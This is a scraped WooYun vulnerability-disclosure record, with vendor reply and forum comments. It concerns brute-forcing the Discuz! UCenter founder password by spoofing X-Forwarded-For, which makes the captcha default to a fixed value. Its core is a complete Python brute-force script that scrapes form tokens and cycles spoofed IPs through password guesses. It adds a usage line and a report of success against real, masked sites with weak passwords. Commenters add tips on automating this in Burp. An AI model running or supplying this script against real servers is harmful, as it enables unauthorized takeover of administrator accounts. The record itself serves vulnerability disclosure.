{"id": 47628, "wybug_id": "wooyun-2014-080211", "wybug_title": "Discuz 的UCenter创始人密码可被爆破（有案例）", "wybug_corp": "Discuz!", "wybug_author": "JJ Fly", "wybug_date": "2014-10-21 09:37", "wybug_open_date": "2015-01-19 09:38", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向公众公开  简要描述： 没看源码，直接黑盒测试的。非验证码识别。so 附上利用代码+几个成功案例。 详细说明：  http://192.168.1.105/discuz/uc_server/admin.php\n\n含有一个验证码验证码的地址为http://localhost/discuz/uc_server/admin.php?m=seccode&seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&7500但是经过测试发现登录uc_server的时候 如果ip第一次出现那么 seccode的默认值为cccc而 ip地址 是通过X-Forwarded-For 获取的。也就是我们修改xff的ip之后，再次打开上面那个验证码url，图片的值为cccc\n\n所以可以写一个程序通过修改X-Forwarded-For的值爆破密码。   漏洞证明：  程序写好了 如下。(代码渣，见谅。)拿创始人密码做案例，管理员密码应该也可以。<poc>\n#coding:utf-8import httplib,re,random,urllib,timefrom sys import argv# 进行爆破 def getHtml(host,htmlhash,htmlpass,htmlseccode):\tip=str(random.randint(1,100))+\".\"+str(random.randint(100,244))+\".\"+str(random.randint(100,244))+\".\"+str(random.randint(100,244))\tpostHead={\"Host\":host,\"User-Agent\": \"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0\",\"X-Forwarded-For\":ip,'Content-Type':'application/x-www-form-urlencoded','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Connection':'keep-alive'}\tpostContent='sid=&formhash='+htmlhash+'&seccodehidden='+htmlseccode+'&iframe=0&isfounder=1&password='+htmlpass+'&seccode=cccc&submit=%E7%99%BB+%E5%BD%95'\tresultHtml=httplib.HTTPConnection(host, 80, False)\tresultHtml.request('POST','/uc_server/admin.php?m=user&a=login',body=postContent,headers = postHead )\tpage=resultHtml.getresponse()\tpageConect=page.read()\treturn pageConect#获取 formhash  和  seccodehiddendef gethashs(host):\turl='http://'+host+'/uc_server/admin.php'\tpageContent=urllib.urlopen(url).read()\tr1=re.compile('<input type=\"hidden\" name=\"formhash\" value=\"(\\S+)\" />')\thtmlhash=r1.findall(pageContent)[0]\tr2=re.compile('<input type=\"hidden\" name=\"seccodehidden\" value=\"(\\S+)\" />')\thtmlseccode=r2.findall(pageContent)[0]\treturn htmlhash+' '+htmlseccode#通过argv获取 host 字典 间隔时间 进行爆破if(len(argv)==1):\tprint '---->python '+argv[0]+' host地址 字典文件 间隔时间'\tprint '---->python '+argv[0]+' 192.168.1.105 pass.txt 0.2'else:\thost=argv[1]\tpassfile=argv[2]\tsleeptime=argv[3]\tprint '网站host为  '+host#取域名 然后添加一些密码 \thostuser=host.split('.')\thostuser=hostuser[len(hostuser)-2]\thostpass=[hostuser+'123',hostuser+'888',hostuser+hostuser,hostuser+'..',hostuser+'.',hostuser+'admin888',hostuser+'admin123',hostuser+'admin',hostuser+'123456']\tprint '密码字典为  '+passfile\tprint '间隔时间为  '+sleeptime\tprint '--->'\tx=gethashs(host).split(' ')\tf=open(passfile,'r')\thtmlpass=f.read().split('\\r\\n')\thtmlpass=hostpass+htmlpass\tf.close()\tfor i in range(len(htmlpass)):\t\ttime.sleep(float(sleeptime))\t\tprint '正在尝试密码'+htmlpass[i]\t\tif(getHtml(host,x[0],htmlpass[i],x[1])==''):\t\t\tprint '密码为 '+htmlpass[i]\t\t\tbreak\n</poc>\n\npython dz_blast.py 192.168.1.117 pass.txt 0192.168.1.117 新建的一个虚拟机 里面搭建的dz\n\n附上几个成功案例  手头没有这种字典，就随便添加了几个密码测试了下，都是很常见的弱口令\n\nmask 区域\n1.http://**.**.**/ admin123456_2.http://**.**.**/  admin_3.http://**.**.**/  123456\n\n\n\n\n\n\n\n\n\n   修复方案：  \n你们更专业\n   版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-10-21 09:43 厂商回复： 谢谢您发现问题。我们尽快予以处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-21 10:02 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  这个貌似要火，前排占位。    \n     2014-10-21 10:38 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  设计缺陷/逻辑错误,api?    \n     2014-10-21 15:02 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  @Discuz! 你四个月前的漏洞还没处理，你能抓点紧吗？    \n     2014-10-21 15:10 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Hmily 大哥 你急啥啊 另外pm俺 有事找你哈    \n     2014-10-21 20:04 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  前排围观    \n     2014-10-23 14:14 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @Hmily @xsser 哈哈、吾爱破解的逆向牛来挖洞了    \n     2014-10-25 02:53 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n  这个貌似要火，前排占位。     \n     2014-12-04 21:13 |    \t\txcrypt \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:9        | 暂无介绍~)\t\t \n  burp可以暴破时不断改变x-forwarded-for，不需要单独写程序了。    \n     2014-12-05 10:27 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  @xcrypt 怎么操作给个教程    \n     2014-12-05 20:38 |    \t\txcrypt \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:9        | 暂无介绍~)\t\t \n  @hkAssassin 可以把IP地址的后两位当做数字，比如1.1到255.255，然后step是0.1，这样每次提交都自动加0.1，每次就都不一样了。    \n     2014-12-26 17:52 |    \t\tHmily \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 吾爱破解论坛)\t\t \n  官方今天发布补丁，解决方案是打了补丁就算你有密码也进不去UC后台！Discuz就是这么任性！    \n     2014-12-26 23:00 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n  这个比较屌！    \n     2015-01-19 10:14 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  屌爆了。    \n     2015-01-19 11:02 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  这么屌？    \n     2015-01-19 11:28 |    \t\t菜菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:7        | 人，可以白手起家，但不可以手无寸铁，紧记...)\t\t \n  火前留名    \n     2015-01-21 16:22 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  本地测试了一下没有成功，请问哥们你测试的是哪个版本？    \n     2015-05-05 06:55 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:33        | 菜鸟一枚。)\t\t \n  这个爆破得不行啊＝ ＝    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}